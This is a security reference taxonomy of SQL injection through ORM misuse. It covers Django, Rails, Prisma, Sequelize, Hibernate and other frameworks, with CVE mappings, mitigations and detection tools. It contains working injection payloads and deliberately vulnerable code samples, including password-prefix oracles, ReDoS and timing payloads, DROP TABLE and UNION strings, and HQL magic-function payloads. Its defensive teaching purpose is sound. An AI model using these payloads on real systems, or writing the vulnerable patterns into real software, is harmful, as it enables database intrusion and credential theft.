# ORM Query Function Misuse → SQL Injection: Mutation/Variation Taxonomy

---

## Classification Structure

Object-Relational Mapping (ORM) frameworks — Django ORM, SQLAlchemy, ActiveRecord (Rails), Hibernate/JPA, Sequelize, TypeORM, Prisma, Entity Framework, Eloquent (Laravel), Doctrine (PHP), GORM (Go), and others — promise to abstract SQL and eliminate injection. In practice, every major ORM ships functions, methods, or API surface that, when fed attacker-controlled input, collapses back into exploitable SQL injection. The vulnerability is never "the ORM is broken" but rather "the ORM exposes unsafe surface that developers assume is safe."

This taxonomy classifies the full mutation space of ORM-mediated SQL injection along three orthogonal axes:

**Axis 1 — Injection Surface (WHAT is the entry point):** The specific ORM API, method, or structural feature through which attacker-controlled input enters the query pipeline. This is the primary axis and structures the body of this document.

**Axis 2 — Root Cause Mechanism (WHY the injection succeeds):** The underlying flaw in how input is processed — string concatenation, unvalidated identifier passthrough, dictionary expansion without sanitization, object-to-query coercion, or parser differentials between the ORM's query language and the underlying SQL dialect.

**Axis 3 — Exploitation Outcome (WHERE it's weaponized):** The resulting attack — authentication bypass, character-by-character data exfiltration (ORM Leak), privilege escalation, authorization filter circumvention, RCE via DBMS functions, or denial of service.

| Root Cause (Axis 2) | Description | Primary Sections |
|---|---|---|
| **String Concatenation** | Raw user input concatenated into query strings without parameterization | §1, §7 |
| **Unvalidated Identifier Passthrough** | Column names, aliases, or table names accepted without allowlist validation | §2 |
| **Dictionary/Object Expansion** | User-controlled dictionaries expanded into query methods via `**kwargs` or equivalent | §3, §4 |
| **Operator/Object Coercion** | Query operators injected as objects where primitives are expected | §5 |
| **Insufficient Escaping** | ORM fails to escape special characters in specific contexts (JSON keys, comments, wildcards) | §2, §6 |
| **Query Language Translation Gap** | Differential between ORM query language (HQL/DQL/JPQL) and underlying SQL exploited | §7 |
| **Protocol-Level Boundary Corruption** | Database wire protocol message boundaries corrupted via oversized parameters | §8 |

---

## §1. Raw/Unsafe Query Execution Functions

Every ORM provides an "escape hatch" for executing raw SQL. These functions bypass all ORM-level parameterization and are the most direct injection surface. The vulnerability is straightforward: developers use string formatting (f-strings, concatenation, `.format()`) instead of parameterized placeholders.

### §1-1. Explicit Raw SQL Execution

These methods accept a complete SQL string and execute it directly against the database.

| Framework | Vulnerable Method(s) | Safe Alternative |
|---|---|---|
| **Django** | `Model.objects.raw(sql)`, `cursor.execute(sql)` | `raw(sql, [params])`, `cursor.execute(sql, [params])` |
| **SQLAlchemy** | `session.execute(text(sql))`, `engine.execute(sql)` | `session.execute(text(sql), {"param": val})` |
| **ActiveRecord** | `ActiveRecord::Base.connection.execute(sql)`, `find_by_sql(sql)` | `find_by_sql([sql, params])` |
| **Hibernate/JPA** | `session.createNativeQuery(sql)`, `entityManager.createNativeQuery(sql)` | `.setParameter("name", value)` |
| **Sequelize** | `sequelize.query(sql)` | `sequelize.query(sql, { replacements: {} })` |
| **TypeORM** | `manager.query(sql)`, `queryRunner.query(sql)` | `manager.query(sql, [params])` |
| **Prisma** | `prisma.$queryRawUnsafe(sql)`, `prisma.$executeRawUnsafe(sql)` | `prisma.$queryRaw\`...\``, `Prisma.sql\`...\`` |
| **Entity Framework** | `context.Database.ExecuteSqlRaw(sql)`, `context.Set<T>().FromSqlRaw(sql)` | `ExecuteSqlInterpolated()`, `FromSqlInterpolated()` |
| **Eloquent** | `DB::statement(sql)`, `DB::select(sql)` | `DB::select(sql, [bindings])` |
| **Doctrine** | `$conn->executeQuery(sql)`, `$conn->exec(sql)` | `$conn->executeQuery(sql, [$param])` |
| **GORM** | `db.Raw(sql).Scan(&result)`, `db.Exec(sql)` | `db.Raw(sql, param).Scan(&result)` |

**Mechanism:** Developer constructs SQL via string interpolation:
```python
# Django — VULNERABLE
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")

# Django — SAFE
User.objects.raw("SELECT * FROM users WHERE name = %s", [name])
```

**Key Condition:** The vulnerability exists whenever the developer uses string formatting rather than parameterized placeholders. The ORM itself is functioning correctly — the developer has opted out of its protections.

### §1-2. Semi-Raw Query Fragment Injection

Many ORMs provide methods that accept SQL fragments for specific query clauses, while still constructing the overall query via ORM methods. These are more dangerous than fully-raw functions because developers perceive them as "still using the ORM."

| Framework | Vulnerable Method(s) | Fragment Context | Safe Pattern |
|---|---|---|---|
| **Django** | `extra(where=[...])`, `extra(select={...})`, `RawSQL()` | WHERE, SELECT, ORDER BY | Deprecated — avoid entirely |
| **SQLAlchemy** | `text()` in `filter()`, `order_by(text(...))` | WHERE, ORDER BY | `text()` with bound params |
| **ActiveRecord** | `where("sql fragment")`, `order("sql")`, `select("sql")`, `group("sql")`, `having("sql")`, `joins("sql")`, `from("sql")`, `pluck("sql")` | All clauses | Hash/array syntax: `where(name: val)` |
| **Eloquent** | `whereRaw()`, `orderByRaw()`, `selectRaw()`, `havingRaw()`, `groupByRaw()`, `DB::raw()` | WHERE, ORDER BY, SELECT, HAVING, GROUP BY | Pass bindings as 2nd arg: `whereRaw('col = ?', [$val])` |
| **Hibernate/JPA** | `createQuery("HQL string")`, `createQuery("JPQL string")` | Full HQL/JPQL | `setParameter()` binding |
| **Doctrine** | `createQuery("DQL string")`, `$qb->where("DQL fragment")` | Full DQL / WHERE | `setParameter()` binding |
| **GORM** | `db.Where("sql fragment")`, `db.Order("sql")` | WHERE, ORDER BY | `db.Where("col = ?", val)` |

**Example — Laravel Eloquent:**
```php
// VULNERABLE — user controls sort direction and column
$posts = Post::orderByRaw($request->input('sort'))->get();

// SAFE — use bindings
$posts = Post::orderByRaw('created_at ?', [$direction])->get();

// SAFEST — allowlist
$allowed = ['created_at', 'title'];
$col = in_array($input, $allowed) ? $input : 'created_at';
```

**Example — ActiveRecord (Rails):**
```ruby
# VULNERABLE — before Rails 6.1, this was accepted without warning
User.order(params[:sort])
User.pluck(params[:column])

# Rails 6.1+ requires Arel.sql() wrapper for raw SQL
User.order(Arel.sql(params[:sort]))  # Still vulnerable if params not validated!

# SAFE — allowlist
User.order(sort_column => sort_direction) if ALLOWED_COLUMNS.include?(sort_column)
```

### §1-3. Stored Procedure / Function Call Injection

Some ORMs provide interfaces for calling database stored procedures or functions. When procedure names or arguments are constructed from user input without parameterization, injection occurs at the call boundary.

| Framework | Vulnerable Pattern | Example |
|---|---|---|
| **Entity Framework** | `context.Database.ExecuteSqlRaw($"EXEC {proc} {arg}")` | Procedure name/arg injection |
| **Django** | `cursor.callproc(proc_name, [args])` with concatenated args | Argument injection |
| **Hibernate** | `session.createStoredProcedureCall(name)` with dynamic name | Procedure name injection |

---

## §2. Column Alias and Identifier Injection

SQL identifiers — column names, table names, aliases — cannot be parameterized in most databases. When an ORM accepts user-controlled strings as identifiers and inserts them into generated SQL without allowlist validation, the attacker controls the structural components of the query.

### §2-1. Column Alias Injection via Aggregation/Annotation

ORM aggregation and annotation methods often accept string keys as column aliases. If these keys are user-controlled and expanded via dictionary unpacking, the alias becomes an injection point.

| Framework | Vulnerable Method(s) | CVE | Mechanism |
|---|---|---|---|
| **Django** | `annotate(**kwargs)`, `alias(**kwargs)`, `aggregate(**kwargs)`, `extra(select=dict)` | CVE-2022-28346, CVE-2025-59681 | Dict keys become SQL aliases; MySQL/MariaDB backends do not properly quote |
| **ActiveRecord** | `annotate("sql fragment")` | CVE-2023-22794 | SQL comment injection in annotation value |
| **SQLAlchemy** | `query.with_entities(text(user_input))` | — | User-controlled `text()` as entity selector |

**Django CVE-2022-28346 / CVE-2025-59681 Example:**
```python
# VULNERABLE — user-controlled dictionary keys become column aliases
user_annotations = request.GET.dict()
queryset = MyModel.objects.annotate(**user_annotations)

# The dict key is injected as a column alias in generated SQL:
# SELECT ... , (expression) AS "injected_alias_payload" FROM ...
```

On MySQL/MariaDB backends, insufficient quoting of the alias value allows breakout from the alias context into arbitrary SQL.

### §2-2. JSONField Key Injection

When JSON field keys participate in query construction as identifiers rather than parameterized values, specially crafted JSON keys become SQL fragments.

| Framework | Vulnerable Method(s) | CVE | Mechanism |
|---|---|---|---|
| **Django** | `values(*args)`, `values_list(*args)` on models with JSONField | CVE-2024-42005 | JSON key passed as `*arg` becomes column alias; HasKey lookup generates unparameterized SQL |

**Django CVE-2024-42005 Example:**
```python
# VULNERABLE — JSON key used as column reference
key = request.GET.get('field')  # attacker controls this
MyModel.objects.values(key)  # if model has JSONField, key becomes SQL fragment
```

The `HasKey` lookup operator used internally for JSONField access constructs SQL identifiers from the JSON key path without adequate escaping, enabling injection via crafted key values (CVSS 9.8).

### §2-3. Dynamic Table/Column Name Injection

When ORMs permit runtime selection of tables or columns from user input, the identifier itself becomes the injection vector since SQL parameterization covers only values, not identifiers.

| Framework | Vulnerable Pattern | Example |
|---|---|---|
| **SQLAlchemy** | `Table(user_input, metadata, autoload=True)` | Table name injection |
| **ActiveRecord** | `Model.from(user_input)` | FROM clause injection |
| **Entity Framework** | `context.Database.ExecuteSqlRaw($"SELECT * FROM {table}")` | Table name via interpolation |
| **GORM** | `db.Table(userInput).Find(&results)` | Table name injection |

**Mitigation:** Identifiers require strict allowlist validation. There is no parameterization-based defense.

---

## §3. Filter Parameter and Lookup Operator Injection (ORM Leak)

This category represents a fundamentally different attack class from traditional SQL injection. Rather than injecting SQL syntax, attackers exploit the ORM's own query API by controlling which fields, lookup operators, and values are used in filter operations. The result is not arbitrary SQL execution but systematic data exfiltration through the ORM's intended query semantics — a technique known as **ORM Leak**.

### §3-1. Field Name Injection via Dictionary Expansion

When applications unpack user-controlled dictionaries directly into ORM filter methods, attackers control which model fields are queried.

| Framework | Vulnerable Pattern | Example |
|---|---|---|
| **Django** | `Model.objects.filter(**request.data)` | `{"password__startswith": "pbkdf2"}` |
| **Prisma** | `prisma.user.findMany({ where: req.body })` | `{"resetToken": {"startsWith": "abc"}}` |
| **Sequelize** | `Model.findAll({ where: req.body })` | `{"password": {"[Op.like]": "a%"}}` |
| **Ransack** | `q(params[:q])` | `q[user_password_start]=a` |

**Mechanism:** The attacker does not inject SQL. Instead, they manipulate the filter parameters to query sensitive fields (password hashes, API tokens, password reset tokens) that the application never intended to expose. Combined with lookup operators (`__startswith`, `__contains`, `__regex`, `__gt`, `__lt`), the attacker builds a character-by-character oracle.

**Django Example:**
```python
# Application code — VULNERABLE
articles = Article.objects.filter(**request.data)

# Attacker sends:
# {"created_by__user__password__startswith": "pbkdf2_sha256$260000$"}
# Response contains articles → prefix matches → extend and repeat
```

### §3-2. Relational Traversal via Lookup Chaining

ORMs that support relationship traversal through their query syntax allow attackers to reach fields on related models that were never intended to be queryable from the current context.

| Framework | Traversal Syntax | Example Attack |
|---|---|---|
| **Django** | Double-underscore (`__`) | `created_by__user__password__startswith` |
| **Prisma** | Nested object with `some`/`every`/`none` | `{"createdBy": {"departments": {"some": {"employees": {"some": {"password": {"startsWith": "x"}}}}}}}` |
| **Ransack** | Underscore-separated field paths | `q[creator_recoveries_key_start]=0` |
| **Sequelize** | Eager-loading with `include` + nested `where` | `include: [{model: User, where: {password: {[Op.like]: 'a%'}}}]` |

**Exploitation Chain:**

1. **One-to-One Traversal:** `created_by__user__password` — follow ForeignKey relationships to access related model fields
2. **Many-to-Many Traversal:** `categories__articles__created_by__user__password` — chain through M2M relationships to reach unintended models
3. **Loopback Traversal:** Circular relationship chains that expand the set of accessible records beyond what the original query intends
4. **Authorization Filter Bypass:** M2M joins generate INNER JOINs that can access records filtered out by the application's own authorization logic

**Example — Filter Bypass via M2M:**
```python
# Application restricts to non-secret articles
articles = Article.objects.filter(is_secret=False, **request.data)

# Attacker sends:
# {"categories__articles__id": 2, "categories__articles__is_secret": true}
# The M2M join allows querying the secret article via a shared category
```

### §3-3. Lookup Operator Selection Injection

When the attacker controls not only the field name but also the lookup operator, they can select the most effective oracle for data exfiltration.

| Operator | ORM(s) | SQL Generated | Oracle Type |
|---|---|---|---|
| `__startswith` / `startsWith` | Django, Prisma | `LIKE 'prefix%'` | Boolean (response presence/absence) |
| `__contains` / `contains` | Django, Prisma | `LIKE '%substr%'` | Boolean / Time-based |
| `__regex` | Django | `REGEXP 'pattern'` | Error-based (ReDoS on MySQL) |
| `__gt` / `__lt` | Django | `> value` / `< value` | Comparison-based binary search |
| `__in` | Django, Prisma | `IN (...)` | Enumeration |
| `[Op.like]` / `[Op.regexp]` | Sequelize | `LIKE` / `REGEXP` | Boolean |
| `_start` / `_cont` | Ransack | `LIKE 'prefix%'` / `LIKE '%substr%'` | Boolean |

**Error-Based Oracle (Django + MySQL):**
```python
# ReDoS payload triggers MySQL regexp_time_limit exception when prefix matches
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
# If password starts with "pbkdf2" → regex catastrophic backtracking → error
# If not → regex fails fast → normal response
```

**Time-Based Oracle (Prisma + PostgreSQL):**
```json
{
  "OR": [
    {"NOT": {"createdBy": {"resetToken": {"startsWith": "target_prefix"}}}},
    {"body": {"contains": "random_string_1"}},
    {"body": {"contains": "random_string_2"}}
  ]
}
```
When the `startsWith` matches, PostgreSQL's query executor processes additional CONTAINS conditions, creating a measurable timing difference (statistically validated via concurrent pairwise comparison, p = 1.58×10⁻⁵⁶).

### §3-4. Wildcard Character Injection in LIKE Operators

When ORM filter methods use SQL `LIKE` clauses without escaping database-level wildcard characters (`%`, `_`), attackers inject wildcards to amplify query behavior.

| Framework | Behavior | Exploitation |
|---|---|---|
| **Prisma** | Does not escape PostgreSQL wildcards in `contains` | Inject `%_` sequences to increase query execution time for time-based oracle |
| **Django** | Escapes `%` and `_` in lookup values | Generally safe, but `__regex` bypasses this protection |
| **Sequelize** | Depends on dialect-specific escaping | MySQL wildcards may pass through |

---

## §4. Internal Query Construction Parameter Injection

Beyond filter fields and operators, ORM query construction may expose internal structural parameters — logical connectors, negation flags, query hints — that were designed for programmatic use but become injectable when user dictionaries are expanded without filtering.

### §4-1. Logical Connector Injection (`_connector`)

| Framework | Vulnerable Parameter | CVE | Impact |
|---|---|---|---|
| **Django** | `_connector` (AND/OR/XOR), `_negated` (boolean) | CVE-2025-64459 | Arbitrary SQL injection via connector value; CVSS 9.1 |

**Mechanism:** Django's `Q()` objects and QuerySet methods (`filter()`, `exclude()`, `get()`) accept `_connector` as an internal keyword argument that controls how query conditions are combined. Prior to patching, this parameter was not validated when supplied through dictionary expansion.

**Exploitation:**
```python
# Application code — VULNERABLE
filters = request.GET.dict()
users = User.objects.filter(**filters)

# Attack 1 — Authentication Bypass
# GET /users/?_connector=OR&is_superuser=True
# Changes AND to OR, matching any user that is superuser OR meets other criteria

# Attack 2 — Logic Inversion
# GET /users/?_negated=True&is_active=True
# Inverts the filter to return inactive users

# Attack 3 — Arbitrary SQL via _connector value
# The _connector value is inserted into generated SQL without sanitization
# Crafted values can break out of the SQL context
```

**Patch:** Django 5.2.8/5.1.14/4.2.26 introduced two-layer validation:
1. QuerySet methods check against a `frozenset` of prohibited parameters, raising `TypeError`
2. Q object validates `_connector` against allowed values (None, AND, OR, XOR), raising `ValueError`

### §4-2. FilteredRelation Alias Injection

| Framework | Vulnerable Feature | CVE | Mechanism |
|---|---|---|---|
| **Django** | `FilteredRelation()` with `annotate()`/`alias()` | CVE-2025-57833 | Column alias in FilteredRelation not properly sanitized when passed via `**kwargs` |

**Mechanism:** When `FilteredRelation` generates SQL for the join alias, it accepts the alias name from the keyword argument key in `annotate()` or `alias()`. A crafted alias value injected via dictionary expansion escapes the quoting context.

---

## §5. Operator/Object Injection (NoSQL-Style Injection in SQL ORMs)

Several JavaScript/TypeScript ORMs accept query operators as object properties. When user input is parsed from JSON request bodies without type validation, attackers inject operator objects where scalar values are expected — a pattern historically associated with NoSQL injection but equally effective against SQL-generating ORMs.

### §5-1. String-Based Operator Injection (Pre-Symbol Era)

| Framework | Vulnerable Version | Operator Syntax | CVE |
|---|---|---|---|
| **Sequelize** | < 4.12.0 | `$gt`, `$like`, `$ne`, `$regexp` | CVE-2019-10748 |

**Mechanism:** Early Sequelize versions accepted operator names as string keys in query objects:
```javascript
// Attacker sends JSON body:
{ "username": "admin", "password": { "$ne": "" } }

// Sequelize generates:
// WHERE username = 'admin' AND password != ''
// → Returns admin user regardless of password
```

The `whereItemQuery()` function processed raw user input containing operator strings without validation, enabling arbitrary WHERE clause manipulation.

**Fix:** Sequelize 4.12+ replaced string operators with Symbol-based operators (`Op.gt`, `Op.like`, `Op.ne`), preventing string-based injection. Applications must set `operatorsAliases: false` to fully disable legacy string operators.

### §5-2. Nested Object Injection in Repository Methods

| Framework | Vulnerable Method(s) | CVE | Mechanism |
|---|---|---|---|
| **TypeORM** | `repository.findOne(userInput)`, `repository.save()`, `repository.update()` | CVE-2022-33171, CVE-2025-60542 | Parsed JSON object passed directly to repository methods; nested objects not stringified by MySQL driver |
| **Prisma** | `findFirst()`, `findMany()`, `updateMany()`, `deleteMany()` | — | Query operators (`startsWith`, `contains`, `gt`, `not`, `in`) accepted as object properties |

**TypeORM CVE-2022-33171 Example:**
```javascript
// VULNERABLE — user-controlled JSON becomes query condition
const user = await userRepository.findOne(JSON.parse(req.body));

// Attacker sends: {"where": {"isAdmin": true}}
// → SELECT * FROM user WHERE isAdmin = true
```

**TypeORM CVE-2025-60542 Example:**
```javascript
// The mysql2 driver's default stringifyObjects: false causes nested objects
// to be interpolated as SQL fragments rather than parameterized values
await repository.save(userControlledData);  // nested objects become SQL
```

### §5-3. Prisma Operator Injection

Prisma's type-safe API accepts filter operators as nested objects, creating an operator injection surface when request bodies are passed through without schema validation.

```javascript
// VULNERABLE
const users = await prisma.user.findMany({
  where: req.body.filter  // attacker controls filter object
});

// Attacker sends:
{
  "filter": {
    "email": { "contains": "@admin" },
    "password": { "startsWith": "hash_prefix" }
  }
}

// Prisma generates valid SQL with LIKE conditions on the password field
```

**Mitigation:** Cast all filter inputs to primitive types (`String()`, `Number()`) before passing to Prisma. Use schema validation (Zod, Joi) to reject unexpected object structures.

---

## §6. Ordering, Grouping, and Aggregate Clause Injection

ORDER BY, GROUP BY, and HAVING clauses are frequent injection targets because: (1) developers often allow user-controlled sort parameters, (2) these clauses accept identifiers that cannot be parameterized, and (3) many ORMs pass raw strings through to SQL in these contexts.

### §6-1. ORDER BY Injection

| Framework | Vulnerable Method(s) | Safe Since | Mitigation |
|---|---|---|---|
| **ActiveRecord** | `order(user_input)`, `reorder(user_input)` | Rails 6.1 (requires `Arel.sql()`) | Allowlist column names |
| **Django** | `order_by(user_input)` | Generally safe for field names; vulnerable with `extra()` or `RawSQL()` | Validate against model fields |
| **SQLAlchemy** | `order_by(text(user_input))` | — | Use column objects, not text |
| **TypeORM** | `queryBuilder.orderBy(user_input)` | — | Allowlist columns |
| **Eloquent** | `orderByRaw(user_input)` | — | Use bindings: `orderByRaw('col ?', [$dir])` |
| **GORM** | `db.Order(user_input)` | — | Use `db.Order("col ?", dir)` |
| **Hibernate** | `createQuery("... ORDER BY " + user_input)` | — | Use Criteria API |

**ActiveRecord Example (Pre-Rails 6.1):**
```ruby
# VULNERABLE — arbitrary SQL in ORDER BY
User.order("name; DROP TABLE users; --")
User.order("(CASE WHEN (SELECT 1 FROM users WHERE admin='1' AND
  SUBSTRING(password,1,1)='a') THEN name ELSE email END)")

# Rails 6.1+ — requires explicit opt-in via Arel.sql()
User.order(Arel.sql(params[:sort]))  # Still vulnerable without allowlist!
```

### §6-2. GROUP BY and HAVING Injection

| Framework | Vulnerable Method(s) | Payload Example |
|---|---|---|
| **ActiveRecord** | `group(user_input)` | `"name UNION SELECT * FROM users"` |
| **ActiveRecord** | `having(user_input)` | `"1) UNION SELECT * FROM orders--"` |
| **Eloquent** | `groupByRaw(user_input)`, `havingRaw(user_input)` | Arbitrary SQL fragment |
| **SQLAlchemy** | `group_by(text(user_input))` | Arbitrary SQL in GROUP BY context |

### §6-3. SELECT / PLUCK Clause Injection

When ORMs accept user-controlled strings as column selectors, the attacker controls the SELECT clause.

| Framework | Vulnerable Method(s) | Impact |
|---|---|---|
| **ActiveRecord** | `select(user_input)`, `pluck(user_input)` (pre-6.1) | Full SELECT clause control: `"* FROM users WHERE admin='1';--"` |
| **ActiveRecord** | `calculate()`, `average()`, `count()`, `maximum()`, `minimum()`, `sum()` | Column argument accepts raw SQL: `"age) FROM users WHERE name='Bob';"` |
| **Eloquent** | `selectRaw(user_input)` | Arbitrary expressions in SELECT |

---

## §7. ORM Query Language Injection (HQL/DQL/JPQL)

Some ORMs implement their own query languages that compile to SQL — Hibernate's HQL, JPA's JPQL, and Doctrine's DQL. These languages are not SQL but share enough syntax that injection is possible. The key difference: the translation layer from ORM-QL to SQL creates additional exploitation techniques not available in direct SQL injection.

### §7-1. HQL/JPQL Injection (Hibernate/JPA)

HQL and JPQL are the most exploited ORM query languages. While they lack SQL features like `UNION` and comments (`--`), the translation to SQL enables advanced exploitation through DBMS-specific functions.

**Injection Context:**
```java
// VULNERABLE — string concatenation in HQL
String hql = "FROM User u WHERE u.username = '" + username + "'";
Query query = session.createQuery(hql);

// SAFE — parameterized
Query query = session.createQuery("FROM User u WHERE u.username = :name");
query.setParameter("name", username);
```

**Limitations of HQL Injection:**
- No `UNION` (strict typing prevents combining different entity types)
- No SQL comments (`--`, `/* */` not supported in HQL parser)
- No direct table access (must reference mapped entities)
- `ORDER BY` / `GROUP BY` contexts severely restricted

**Bypass Techniques:**

| Technique | Target DBMS | Mechanism | Payload Pattern |
|---|---|---|---|
| **Magic Function Abuse** | PostgreSQL | `query_to_xml()` evaluates arbitrary SQL in string parameter | `array_upper(xpath('row',query_to_xml('SELECT version()',true,false,'')),1)` |
| **Magic Function Abuse** | Oracle | `DBMS_XMLGEN.getxml()` evaluates arbitrary SQL | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('SELECT banner FROM v$version')),'1')!='1'` |
| **Single Quote Escaping Differential** | MySQL | MySQL uses `\` escape, HQL uses doubled quotes | `'abc\''or 1=(select 1)--'` |
| **Dollar-Quoted Strings** | PostgreSQL, H2 | `$$` delimiters bypass HQL quoting | `$$='$$=concat(chr(61),chr(39)) and 1=1--'` |
| **Unicode Delimiters** | MSSQL, H2 | Non-breaking space (`U+00A0`) between tokens bypasses parser | Token separation via invisible characters |
| **Java Constants Resolution** | All (via Hibernate) | Hibernate resolves `public static` fields from classpath | `org.apache.batik.util.XMLConstants.XML_CHAR_APOS` provides quote character |
| **Error-Based Extraction** | All | Force type cast errors that include data in error message | Subquery result cast to incompatible type |

### §7-2. DQL Injection (Doctrine/PHP)

DQL (Doctrine Query Language) is more restricted than HQL but still exploitable.

**Injection Context:**
```php
// VULNERABLE
$dql = "SELECT u FROM App\Entity\User u WHERE u.username = '" . $_GET['username'] . "'";
$query = $entityManager->createQuery($dql);

// SAFE
$query = $entityManager->createQuery(
    "SELECT u FROM App\Entity\User u WHERE u.username = :name"
);
$query->setParameter('name', $_GET['username']);
```

**DQL-Specific Limitations and Exploits:**

| Aspect | Behavior |
|---|---|
| `UNION` | Not supported — strict entity typing |
| `INSERT` | Not supported in DQL |
| `LIMIT` | Not supported — use `setMaxResults()` |
| Table access | Only through mapped entity classes |
| Boolean-based blind | `1 or 1=(select 1 from App\Entity\User a where a.id=1 and substring(a.password,1,1)='$')` |
| Error-based (SQLite) | Exploit PHP UDFs (`SQRT`, `MOD`, `LOCATE`) not implemented in SQLite → exceptions leak data in debug mode |
| UPDATE-based exfil | Subqueries write secrets to publicly accessible model fields |

**Key Insight:** DQL attackers cannot access database tables that lack corresponding entity model definitions in the application code, fundamentally limiting the attack surface compared to raw SQL injection.

### §7-3. HQL Injection in ORDER BY Context

ORDER BY injection in HQL is particularly challenging because of parser restrictions. However, exploitation is possible via:

| Technique | DBMS | Payload |
|---|---|---|
| **CASE-based blind** | All | `(CASE WHEN (subquery) THEN fieldA ELSE fieldB END)` |
| **Function-based** | PostgreSQL | `dbms_pipe_receive_message()` equivalent via XML functions |
| **Error-based** | Oracle | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('SQL')), col)` |

---

## §8. Database Driver Protocol-Level Query Smuggling

A fundamentally distinct attack class where the injection occurs not in SQL syntax construction but in the binary protocol layer between the ORM's database driver and the database server.

### §8-1. Wire Protocol Message Boundary Corruption

| Target | CVE | Driver(s) | Mechanism |
|---|---|---|---|
| **PostgreSQL** | CVE-2024-27304 | pgx (Go), Npgsql (.NET), Diesel (Rust), SQLx (Rust) | 32-bit message length overflow via parameter > 4GB |

**Mechanism:** PostgreSQL's wire protocol uses a 32-bit integer for message length fields. When a parameter string exceeds 2³² bytes, the length field overflows, causing the database to misinterpret subsequent bytes as a new protocol message. The attacker embeds a complete SQL statement in the overflow region.

**Attack Chain:**
1. Application uses parameterized query (seemingly safe)
2. Attacker provides a parameter value exceeding 4GB
3. The database driver constructs a protocol message where the length field wraps around
4. PostgreSQL interprets the overflow data as a separate query message
5. The embedded query executes with full database privileges

**Impact:** Authentication bypass, data exfiltration, RCE — all despite the application using properly parameterized queries.

**Mitigation:** Enforce input size limits at the application layer. Affected drivers have been patched to validate message lengths before transmission.

### §8-2. Encoding Mismatch Injection

| Target | CVE | Mechanism |
|---|---|---|
| **PostgreSQL** | CVE-2025-1094 | Multibyte character encoding (e.g., `BIG5`, `SJIS`) causes quote escaping routines to fail when client and server encodings differ |

**Mechanism:** When the PostgreSQL client library's escaping function processes multibyte characters, a trailing byte of a multibyte sequence can be `0x27` (single quote). If the client encodes in one charset and the server interprets in another, the escape routine may not recognize the quote, leaving it unescaped in the SQL string.

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture/Condition | Primary Mutation Categories | Typical Oracle |
|---|---|---|---|
| **Authentication Bypass** | Login filter uses `filter(**user_input)` or `findOne(user_input)` | §3, §4, §5 | Boolean (login success/failure) |
| **Character-by-Character Data Exfiltration** | Filter endpoint exposes field name control + lookup operators | §3-1, §3-2, §3-3 | Boolean, Error, Time-based |
| **Mass Data Exfiltration** | Raw query or UNION-capable injection point | §1, §7-1 (with magic functions) | Direct (query result in response) |
| **Privilege Escalation** | Admin flag or role queryable via filter manipulation | §3-1, §4-1 | Boolean |
| **Authorization Filter Circumvention** | M2M relationships allow join-based bypass of access controls | §3-2 | Boolean |
| **Remote Code Execution** | DBMS supports code execution (PostgreSQL `COPY TO PROGRAM`, MySQL `INTO OUTFILE`, MSSQL `xp_cmdshell`) | §1-1, §7-1 (via magic functions), §8-1 | Direct |
| **Denial of Service** | ReDoS payloads, heavy LIKE patterns, or cartesian joins | §3-3 (regex), §3-4 (wildcard), §6 | Time-based / Error |

---

## CVE / Bounty Mapping (2019–2025)

| Mutation Combination | CVE / Case | Framework | Impact / Notes |
|---|---|---|---|
| §2-1 (alias injection) | CVE-2022-28346 | Django | `annotate()`, `aggregate()`, `extra()` — dict expansion alias injection |
| §2-2 (JSONField key) | CVE-2024-42005 | Django | `values()` / `values_list()` on JSONField; CVSS 9.8 |
| §2-1 (alias injection) | CVE-2025-59681 | Django | `annotate()`, `alias()`, `aggregate()`, `extra()` — MySQL/MariaDB backends |
| §4-1 (connector injection) | CVE-2025-64459 | Django | `_connector` / `_negated` injection in `filter()`, `exclude()`, `get()`, `Q()`; CVSS 9.1 |
| §4-2 (FilteredRelation) | CVE-2025-57833 | Django | `FilteredRelation` alias injection via `annotate()`/`alias()` |
| §6-2 (comment injection) | CVE-2023-22794 | ActiveRecord (Rails) | SQL comment injection in `annotate()` |
| §5-1 (string operator) | CVE-2019-10748 | Sequelize | String-based operator injection (`$gt`, `$ne`, `$like`) |
| §5-2 (replacements) | CVE-2023-25813 | Sequelize | SQL injection via `replacements` parameter |
| §5-2 (nested object) | CVE-2022-33171 | TypeORM | `findOne()` parsed JSON injection |
| §5-2 (driver object) | CVE-2025-60542 | TypeORM | `repository.save()`/`update()` — mysql2 driver `stringifyObjects` default |
| §8-1 (protocol overflow) | CVE-2024-27304 | pgx, Npgsql, Diesel, SQLx | PostgreSQL wire protocol 32-bit length overflow |
| §8-2 (encoding mismatch) | CVE-2025-1094 | PostgreSQL (libpq) | Multibyte encoding mismatch quote escape bypass |
| §7-1 (HQL injection) | CVE-2020-25638 | Hibernate | SQL comment injection in `@Where` annotation |
| §3-1 (ORM Leak) | CVE-2023-47117 | Django (Label Studio) | Filter parameter injection exfiltrating user data |
| §3-1 (ORM Leak) | CVE-2023-31133 | Prisma (Ghost CMS) | Operator injection leaking member data |
| §3-1 (ORM Leak) | CVE-2023-30843 | Prisma (Payload CMS) | Operator injection leaking credentials |
| §3-1 (Ransack Leak) | — (multiple apps) | Ransack (Rails) | Password reset token exfiltration (fablabs.io, CodeOcean, etc.) |

---

## Detection Tools

### Static Analysis (Code Review)

| Tool | Target | Core Technique |
|---|---|---|
| **Semgrep** (SAST) | Python, JS, Java, Go, Ruby, PHP | Taint tracking rules for ORM sink functions; `p/sql-injection` ruleset |
| **Brakeman** (SAST) | Ruby on Rails | Static analysis specific to ActiveRecord dangerous methods (`order`, `where`, `find_by_sql`) |
| **Bandit** (SAST) | Python | Detects `raw()`, `extra()`, string-formatted SQL in Django/SQLAlchemy |
| **SonarQube** (SAST) | Multi-language | ORM injection detection rules for Django, Hibernate, Entity Framework, Doctrine |
| **Laravel Enlightn** (SAST) | PHP/Laravel | Raw SQL injection analyzer for `whereRaw()`, `orderByRaw()`, `DB::raw()` |
| **CodeQL** (SAST) | Multi-language | Custom queries for ORM injection patterns with taint tracking |

### Dynamic Analysis (Runtime Testing)

| Tool | Target | Core Technique |
|---|---|---|
| **sqlmap** (DAST) | Any SQL backend | Automated injection detection: boolean-blind, time-blind, error-based, UNION, stacked queries |
| **plormber** (ORM Leak) | Django, Prisma | Automated character-by-character ORM Leak exploitation via time-based and boolean oracles |
| **Burp Suite** (DAST) | Web applications | Manual/automated testing of filter parameters, operator injection, and raw SQL endpoints |
